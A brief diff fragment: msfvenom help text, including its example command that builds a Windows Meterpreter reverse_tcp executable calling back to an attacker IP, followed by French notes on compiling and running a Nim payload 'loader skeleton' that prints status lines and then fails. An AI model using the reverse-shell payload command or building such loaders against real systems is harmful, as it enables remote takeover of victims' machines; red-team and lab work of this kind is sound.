@@ -102,3 +102,13 @@ MsfVenom, a Metasploit standalone payload generator.
 Also a replacement for msfpayload and msfencode.
 Usage: /opt/metasploit-framework/bin/../embedded/framework/msfvenom [options] <var=val>
 Example: /opt/metasploit-framework/bin/../embedded/framework/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
+
+J’ai compilé et exécuté le squelette du loader.
+
+La compilation Nim réussit.
+À l’exécution, le programme affiche.
+loader initialisé
+loader prêt
+taille payload = 8
+
+Après ces affichages, l’exécution se termine et Nim remonte un échec d’exécution du binaire lors du lancement avec nim c -r.
